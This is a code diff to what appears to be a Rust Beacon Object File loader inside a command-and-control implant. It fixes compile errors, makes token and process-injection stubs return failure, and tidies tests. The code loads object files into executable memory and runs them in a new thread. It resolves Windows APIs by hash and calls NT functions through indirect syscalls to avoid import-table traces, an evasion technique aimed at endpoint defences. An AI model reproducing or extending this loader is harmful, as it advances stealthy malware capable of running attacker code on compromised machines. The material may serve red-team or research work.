@@ -173,9 +173,13 @@ unsafe fn append_output(data: &[u8]) {
     let len = OUTPUT_BUFFER_LEN.load(Ordering::SeqCst);
     let cap = OUTPUT_BUFFER_CAP.load(Ordering::SeqCst);
     // P2-07: Overflow check for buffer size calculation.
-    let needed = len.checked_add(data.len()).ok_or_else(|| {
-        std::io::Error::new(std::io::ErrorKind::InvalidData, "buffer overflow in append_output")
-    })?;
+    let needed = match len.checked_add(data.len()) {
+        Some(v) => v,
+        None => {
+            log::warn!("[coff_loader] append_output overflow, dropping output chunk");
+            return;
+        }
+    };
 
     if needed > cap {
         let new_cap = (needed * 2).max(4096);
@@ -336,7 +340,7 @@ unsafe extern "C" fn beacon_data_extract(parser: *mut BeaconDataParser, size: *m
 ///   platform-specific.
 /// - The `cvt` crate provides C variadic argument access but adds a
 ///   dependency and has its own platform limitations.
-unsafe extern "C" fn beacon_printf(_typ: i32, fmt: *const i8, ...) -> i32 {
+unsafe extern "C" fn beacon_printf(_typ: i32, fmt: *const i8) -> i32 {
     if fmt.is_null() {
         return 0;
     }
@@ -371,10 +375,11 @@ unsafe extern "C" fn beacon_output(_typ: i32, data: *mut u8, len: i32) {
 /// `BeaconUseToken(token_handle)` — delegate to token manipulation.
 unsafe extern "C" fn beacon_use_token(_token: *mut c_void) -> i32 {
     // Token manipulation uses username/password/steal-token, not
-    // raw handles.  Return 0 (success) as a no-op stub.  Full implementation
+    // raw handles.  Return explicit failure so BOFs don't assume token
+    // impersonation succeeded. Full implementation
     // would call super::token_manipulation APIs.
-    log::warn!("[coff_loader] BeaconUseToken called — stub, no-op");
-    0
+    log::warn!("[coff_loader] BeaconUseToken called — stub, returning failure");
+    -1
 }
 
 /// `BeaconRevertToken()` — delegate to rev2self.
@@ -403,10 +408,13 @@ unsafe extern "C" fn beacon_get_spawn_to(_x86: i32, buffer: *mut u8, length: i32
 unsafe extern "C" fn beacon_spawn_temporary_process(
     _x86: i32,
     _suppressed: i32,
-    _handle: *mut *mut c_void,
+    handle: *mut *mut c_void,
 ) -> i32 {
-    log::warn!("[coff_loader] BeaconSpawnTemporaryProcess called — stub");
-    0
+    if !handle.is_null() {
+        *handle = std::ptr::null_mut();
+    }
+    log::warn!("[coff_loader] BeaconSpawnTemporaryProcess called — stub, returning failure");
+    -1
 }
 
 /// `BeaconInjectProcess(hproc, pid, payload, pLen, pOffset)` — inject into process.
@@ -417,8 +425,8 @@ unsafe extern "C" fn beacon_inject_process(
     _p_len: i32,
     _p_offset: i32,
 ) -> i32 {
-    log::warn!("[coff_loader] BeaconInjectProcess called — stub");
-    0
+    log::warn!("[coff_loader] BeaconInjectProcess called — stub, returning failure");
+    -1
 }
 
 /// `BeaconInjectTemporaryProcess(hproc, pid, payload, pLen, pOffset)` — inject into temp process.
@@ -429,8 +437,8 @@ unsafe extern "C" fn beacon_inject_temporary_process(
     _p_len: i32,
     _p_offset: i32,
 ) -> i32 {
-    log::warn!("[coff_loader] BeaconInjectTemporaryProcess called — stub");
-    0
+    log::warn!("[coff_loader] BeaconInjectTemporaryProcess called — stub, returning failure");
+    -1
 }
 
 /// `BeaconCleanupProcess(hproc)` — cleanup process handle.
@@ -528,7 +536,7 @@ unsafe extern "C" fn crt_strlen(s: *const i8) -> usize {
     len
 }
 
-unsafe extern "C" fn crt_sprintf(dst: *mut i8, fmt: *const i8, ...) -> i32 {
+unsafe extern "C" fn crt_sprintf(dst: *mut i8, fmt: *const i8) -> i32 {
     // Minimal: just copy fmt if no % (most BOF uses BeaconPrintf).
     let fmt_cstr = std::ffi::CStr::from_ptr(fmt);
     let bytes = fmt_cstr.to_bytes();
@@ -538,14 +546,14 @@ unsafe extern "C" fn crt_sprintf(dst: *mut i8, fmt: *const i8, ...) -> i32 {
     copy_len as i32
 }
 
-unsafe extern "C" fn crt_printf(fmt: *const i8, ...) -> i32 {
+unsafe extern "C" fn crt_printf(fmt: *const i8) -> i32 {
     let fmt_cstr = std::ffi::CStr::from_ptr(fmt);
     let bytes = fmt_cstr.to_bytes();
     append_output(bytes);
     bytes.len() as i32
 }
 
-unsafe extern "C" fn crt_snprintf(dst: *mut i8, count: usize, fmt: *const i8, ...) -> i32 {
+unsafe extern "C" fn crt_snprintf(dst: *mut i8, count: usize, fmt: *const i8) -> i32 {
     let fmt_cstr = std::ffi::CStr::from_ptr(fmt);
     let bytes = fmt_cstr.to_bytes();
     let copy_len = std::cmp::min(bytes.len(), count.saturating_sub(1));
@@ -569,7 +577,7 @@ where
 {
     let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
     let addr = pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(name))?;
-    Some(std::mem::transmute::<usize, T>(addr))
+    Some(std::mem::transmute_copy(&addr))
 }
 
 /// Get the current process heap via runtime-resolved GetProcessHeap.
@@ -920,7 +928,7 @@ pub unsafe fn execute_bof(
     // VirtualAlloc → NtAllocateVirtualMemory
     let mut base_ptr: usize = 0;
     let mut region_size = total_size;
-    let alloc_status = syscall!(
+    let alloc_status = crate::syscall!(
         "NtAllocateVirtualMemory",
         (-1isize) as u64,                    // NtCurrentProcess()
         &mut base_ptr as *mut _ as u64,     // BaseAddress (in/out)
@@ -1127,7 +1135,7 @@ pub unsafe fn execute_bof(
         let mut base_addr = (base as usize + offset) as *mut c_void;
         let mut sec_size = section_size;
         let mut old_prot: u32 = 0;
-        let _ = syscall!(
+        let _ = crate::syscall!(
             "NtProtectVirtualMemory",
             (-1isize) as u64,                        // NtCurrentProcess()
             &mut base_addr as *mut _ as u64,         // BaseAddress (in/out)
@@ -1145,7 +1153,7 @@ pub unsafe fn execute_bof(
     // with split TLBs), stale cached instructions may be executed without
     // this flush.  Non-fatal: log and continue regardless.
     {
-        let flush_status = syscall!(
+        let flush_status = crate::syscall!(
             "NtFlushInstructionCache",
             (-1isize) as u64,             // NtCurrentProcess()
             base as usize as u64,         // COFF base address
@@ -1195,7 +1203,7 @@ pub unsafe fn execute_bof(
             // Free COFF memory before returning.
             let mut base_addr = base as usize;
             let mut free_size: usize = 0;
-            let _ = syscall!(
+            let _ = crate::syscall!(
                 "NtFreeVirtualMemory",
                 (-1isize) as u64,
                 &mut base_addr as *mut _ as u64,
@@ -1214,7 +1222,7 @@ pub unsafe fn execute_bof(
         // Allocate a buffer that the BOF can read.
         let mut arg_buf_ptr: usize = 0;
         let mut arg_region_size = packed_args.len();
-        let arg_alloc_status = syscall!(
+        let arg_alloc_status = crate::syscall!(
             "NtAllocateVirtualMemory",
             (-1isize) as u64,
             &mut arg_buf_ptr as *mut _ as u64,
@@ -1226,7 +1234,7 @@ pub unsafe fn execute_bof(
         if arg_alloc_status.is_err() || arg_alloc_status.unwrap() < 0 || arg_buf_ptr == 0 {
             let mut base_addr = base as usize;
             let mut free_size: usize = 0;
-            let _ = syscall!(
+            let _ = crate::syscall!(
                 "NtFreeVirtualMemory",
                 (-1isize) as u64,
                 &mut base_addr as *mut _ as u64,
@@ -1253,13 +1261,13 @@ pub unsafe fn execute_bof(
 
     // CreateThread → NtCreateThreadEx (indirect syscall, no IAT entry)
     let mut thread_handle_raw: usize = 0;
-    let thread_status = syscall!(
+    let thread_status = crate::syscall!(
         "NtCreateThreadEx",
         &mut thread_handle_raw as *mut _ as u64, // ThreadHandle
         THREAD_WAIT_ACCESS,                              // minimal thread access
         std::ptr::null::<u64>() as u64,            // ObjectAttributes
         (-1isize) as u64,                          // NtCurrentProcess()
-        Some(std::mem::transmute(go_fn as *const c_void)) as *const _ as u64, // StartRoutine
+        go_addr as u64,                            // StartRoutine
         args_ptr as *mut c_void as u64,            // Argument
         0u64,                                      // CreateSuspended
         0u64,                                      // ZeroBits
@@ -1273,7 +1281,7 @@ pub unsafe fn execute_bof(
         if !args_ptr.is_null() {
             let mut arg_addr = args_ptr as usize;
             let mut free_sz: usize = 0;
-            let _ = syscall!(
+            let _ = crate::syscall!(
                 "NtFreeVirtualMemory",
                 (-1isize) as u64,
                 &mut arg_addr as *mut _ as u64,
@@ -1283,7 +1291,7 @@ pub unsafe fn execute_bof(
         }
         let mut base_addr = base as usize;
         let mut free_size: usize = 0;
-        let _ = syscall!(
+        let _ = crate::syscall!(
             "NtFreeVirtualMemory",
             (-1isize) as u64,
             &mut base_addr as *mut _ as u64,
@@ -1297,7 +1305,7 @@ pub unsafe fn execute_bof(
     // Wait with timeout.
     // WaitForSingleObject → NtWaitForSingleObject (indirect syscall)
     let timeout_100ns: i64 = -((timeout as i64) * 10_000_000);
-    let wait_status = syscall!(
+    let wait_status = crate::syscall!(
         "NtWaitForSingleObject",
         thread_handle as u64,
         0u64, // Alertable = FALSE
@@ -1317,7 +1325,7 @@ pub unsafe fn execute_bof(
 
     // ── Cleanup ─────────────────────────────────────────────────────────
     // CloseHandle → NtClose
-    let _ = syscall!("NtClose", thread_handle as u64);
+    let _ = crate::syscall!("NtClose", thread_handle as u64);
 
     // Free args buffer.
     if !args_ptr.is_null() {
@@ -1325,7 +1333,7 @@ pub unsafe fn execute_bof(
         std::ptr::write_bytes(args_ptr, 0, args_len as usize);
         let mut arg_addr = args_ptr as usize;
         let mut free_sz: usize = 0;
-        let _ = syscall!(
+        let _ = crate::syscall!(
             "NtFreeVirtualMemory",
             (-1isize) as u64,
             &mut arg_addr as *mut _ as u64,
@@ -1338,7 +1346,7 @@ pub unsafe fn execute_bof(
     std::ptr::write_bytes(base as *mut u8, 0, total_size);
     let mut base_addr = base as usize;
     let mut free_size: usize = 0;
-    let _ = syscall!(
+    let _ = crate::syscall!(
         "NtFreeVirtualMemory",
         (-1isize) as u64,
         &mut base_addr as *mut _ as u64,
@@ -1370,24 +1378,30 @@ mod tests {
     #[test]
     fn input_validation_rejects_empty() {
         let result = unsafe { execute_bof(&[], &[], None) };
-        assert!(result.is_err());
-        assert!(result.unwrap_err().contains("empty"));
+        match result {
+            Ok(_) => panic!("expected empty BOF to be rejected"),
+            Err(e) => assert!(e.contains("empty")),
+        }
     }
 
     #[test]
     fn input_validation_rejects_oversized() {
         let big = vec![0u8; MAX_COF_SIZE + 1];
         let result = unsafe { execute_bof(&big, &[], None) };
-        assert!(result.is_err());
-        assert!(result.unwrap_err().contains("too large"));
+        match result {
+            Ok(_) => panic!("expected oversized BOF to be rejected"),
+            Err(e) => assert!(e.contains("too large")),
+        }
     }
 
     #[test]
     fn input_validation_rejects_too_many_args() {
         let args: Vec<String> = (0..MAX_ARGS + 1).map(|i| format!("arg{}", i)).collect();
         let result = unsafe { execute_bof(&[0u8; 100], &args, None) };
-        assert!(result.is_err());
-        assert!(result.unwrap_err().contains("too many arguments"));
+        match result {
+            Ok(_) => panic!("expected too many BOF args to be rejected"),
+            Err(e) => assert!(e.contains("too many arguments")),
+        }
     }
 
     #[test]
@@ -1404,7 +1418,7 @@ mod tests {
 
     #[test]
     fn coff_symbol_name_inline() {
-        let mut symbol = std::mem::zeroed::<CoffSymbol>();
+        let mut symbol = unsafe { std::mem::zeroed::<CoffSymbol>() };
         symbol.name[..5].copy_from_slice(b"go\x00\x00\x00");
         let name = coff_symbol_name(&symbol, &[]);
         assert_eq!(name, "go");
